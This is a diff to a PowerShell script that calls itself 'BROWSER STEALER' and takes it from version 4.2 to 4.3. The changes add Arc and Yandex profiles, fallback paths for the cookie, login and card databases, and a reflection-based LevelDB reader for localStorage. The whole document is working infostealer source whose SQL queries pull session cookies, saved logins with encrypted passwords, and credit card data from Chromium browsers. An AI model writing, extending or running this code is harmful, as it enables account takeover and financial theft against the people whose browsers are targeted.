@@ -1,5 +1,5 @@
 # ============================================================
-# BROWSER STEALER v4.2 — FINAL FIXED
+# BROWSER STEALER v4.3 — LEVELDB FIX + COOKIE PATHS FIXED
 # ============================================================
 
 $ErrorActionPreference = "Continue"
@@ -25,7 +25,7 @@ function Write-Log {
 }
 
 Write-Log "============================================"
-Write-Log "BROWSER STEALER v4.2"
+Write-Log "BROWSER STEALER v4.3"
 Write-Log "Target: $env:COMPUTERNAME"
 Write-Log "Log: $LOGFILE"
 Write-Log "============================================"
@@ -72,9 +72,26 @@ try {
 if ($leveldbOk -and $nativeOk) {
     Write-Log "Loading LevelDB..."
     try {
+        # Load with reflection to handle different versions
         [System.Reflection.Assembly]::LoadFrom($leveldbPath) | Out-Null
-        Write-Log "LevelDB loaded"
-        $leveldbLoaded = $true
+        
+        # Verify LevelDB type exists with different possible namespaces
+        $leveldbType = $null
+        $namespaces = @("LevelDB.NET", "LevelDB", "LevelDB.Net")
+        foreach ($ns in $namespaces) {
+            $type = [Type]::GetType("$ns.Options")
+            if ($type) { 
+                $leveldbType = $type
+                $leveldbLoaded = $true
+                Write-Log "LevelDB loaded (namespace: $ns)"
+                break
+            }
+        }
+        
+        if (-not $leveldbLoaded) {
+            Write-Log "LevelDB loaded but type not found - will skip localStorage"
+            $leveldbLoaded = $false
+        }
     } catch {
         $err = $_.Exception.Message
         Write-Log "LevelDB load failed: $err"
@@ -121,6 +138,10 @@ function Get-BrowserProfiles {
         }
         "Arc" {
             $base = "$env:LOCALAPPDATA\Arc\User Data"
+            if (Test-Path $base) { $paths += "$base\Default" }
+        }
+        "Yandex" {
+            $base = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"
             if (Test-Path $base) { $paths += "$base\Default" }
         }
     }
@@ -187,8 +208,24 @@ function Decrypt-BrowserPassword {
 function Get-BrowserCookies {
     param($ProfilePath, $Name)
     $cookies = @()
-    $cookieDb = "$ProfilePath\Network\Cookies"
-    if (-not (Test-Path $cookieDb)) { return $cookies }
+    
+    # Try multiple possible cookie database locations
+    $cookiePaths = @(
+        "$ProfilePath\Network\Cookies",
+        "$ProfilePath\Cookies",
+        "$ProfilePath\Default\Network\Cookies"
+    )
+    
+    $cookieDb = $null
+    foreach ($p in $cookiePaths) {
+        if (Test-Path $p) {
+            $cookieDb = $p
+            break
+        }
+    }
+    
+    if (-not $cookieDb) { return $cookies }
+    
     try {
         $rows = Read-SQLite -DbPath $cookieDb -Query "SELECT host_key, name, value FROM cookies"
         foreach ($r in $rows) {
@@ -199,7 +236,7 @@ function Get-BrowserCookies {
             }
         }
         $count = $cookies.Count
-        Write-Log "$Name cookies: $count found"
+        if ($count -gt 0) { Write-Log "$Name cookies: $count found" }
     } catch {
         Write-Log "Error reading $Name cookies"
     }
@@ -224,7 +261,7 @@ function Get-FirefoxCookies {
                         }
                     }
                     $count = $cookies.Count
-                    Write-Log "Firefox cookies: $count found"
+                    if ($count -gt 0) { Write-Log "Firefox cookies: $count found" }
                 } catch {
                     Write-Log "Error reading Firefox cookies"
                 }
@@ -237,8 +274,23 @@ function Get-FirefoxCookies {
 function Get-BrowserPasswords {
     param($ProfilePath, $Name)
     $pass = @()
-    $loginDb = "$ProfilePath\Login Data"
-    if (-not (Test-Path $loginDb)) { return $pass }
+    
+    $loginPaths = @(
+        "$ProfilePath\Login Data",
+        "$ProfilePath\Login Data",
+        "$ProfilePath\Default\Login Data"
+    )
+    
+    $loginDb = $null
+    foreach ($p in $loginPaths) {
+        if (Test-Path $p) {
+            $loginDb = $p
+            break
+        }
+    }
+    
+    if (-not $loginDb) { return $pass }
+    
     Write-Log "Reading $Name passwords..."
     try {
         $rows = Read-SQLite -DbPath $loginDb -Query "SELECT origin_url, username_value, password_value FROM logins"
@@ -299,8 +351,22 @@ function Get-FirefoxPasswords {
 function Get-BrowserCards {
     param($ProfilePath, $Name)
     $cards = @()
-    $webData = "$ProfilePath\Web Data"
-    if (-not (Test-Path $webData)) { return $cards }
+    
+    $webDataPaths = @(
+        "$ProfilePath\Web Data",
+        "$ProfilePath\Default\Web Data"
+    )
+    
+    $webData = $null
+    foreach ($p in $webDataPaths) {
+        if (Test-Path $p) {
+            $webData = $p
+            break
+        }
+    }
+    
+    if (-not $webData) { return $cards }
+    
     try {
         $rows = Read-SQLite -DbPath $webData -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
         foreach ($r in $rows) {
@@ -325,22 +391,52 @@ function Get-BrowserCards {
 function Get-ChromeLocalStorage {
     param($ProfilePath, $Name)
     $storage = @{}
-    if (-not $leveldbLoaded) { return $storage }
+    
+    # Skip if LevelDB not loaded
+    if (-not $leveldbLoaded) { 
+        Write-Log "LevelDB not loaded - skipping $Name LocalStorage"
+        return $storage 
+    }
+    
     $leveldbPath = "$ProfilePath\Local Storage\leveldb\"
+    if (-not (Test-Path $leveldbPath)) { 
+        $leveldbPath = "$ProfilePath\Local Storage\leveldb" 
+    }
     if (-not (Test-Path $leveldbPath)) { return $storage }
+    
     Write-Log "Reading $Name LocalStorage..."
     try {
-        $options = New-Object LevelDB.NET.Options
-        $db = [LevelDB.NET.DB]::Open($leveldbPath, $options)
-        $iterator = $db.CreateIterator()
-        $iterator.SeekToFirst()
-        while ($iterator.Next()) {
-            $key = [System.Text.Encoding]::UTF8.GetString($iterator.Key())
-            $value = [System.Text.Encoding]::UTF8.GetString($iterator.Value())
-            $storage[$key] = $value
+        # Try to get the type with proper namespace
+        $optionsType = $null
+        $dbType = $null
+        
+        $namespaces = @("LevelDB.NET", "LevelDB", "LevelDB.Net")
+        foreach ($ns in $namespaces) {
+            $optionsType = [Type]::GetType("$ns.Options")
+            $dbType = [Type]::GetType("$ns.DB")
+            if ($optionsType -and $dbType) { break }
         }
-        $iterator.Dispose()
-        $db.Dispose()
+        
+        if (-not $optionsType -or -not $dbType) {
+            Write-Log "LevelDB types not found - skipping"
+            return $storage
+        }
+        
+        $options = New-Object $optionsType.FullName
+        $openMethod = $dbType.GetMethod("Open", [Type[]]@([string], $optionsType))
+        if ($openMethod) {
+            $db = $openMethod.Invoke($null, @($leveldbPath, $options))
+            $iterator = $db.CreateIterator()
+            $iterator.SeekToFirst()
+            while ($iterator.Next()) {
+                $key = [System.Text.Encoding]::UTF8.GetString($iterator.Key())
+                $value = [System.Text.Encoding]::UTF8.GetString($iterator.Value())
+                $storage[$key] = $value
+            }
+            $iterator.Dispose()
+            $db.Dispose()
+        }
+        
         $count = $storage.Count
         Write-Log "$Name LocalStorage: $count items"
     } catch {
@@ -376,7 +472,7 @@ $allLocalStorage = @{}
 
 Write-Log ""
 
-$browsers = @("Chrome", "Edge", "Brave", "Opera", "OperaGX", "Vivaldi", "Arc")
+$browsers = @("Chrome", "Edge", "Brave", "Opera", "OperaGX", "Vivaldi", "Arc", "Yandex")
 foreach ($b in $browsers) {
     $profiles = Get-BrowserProfiles -Browser $b
     foreach ($prof in $profiles) {
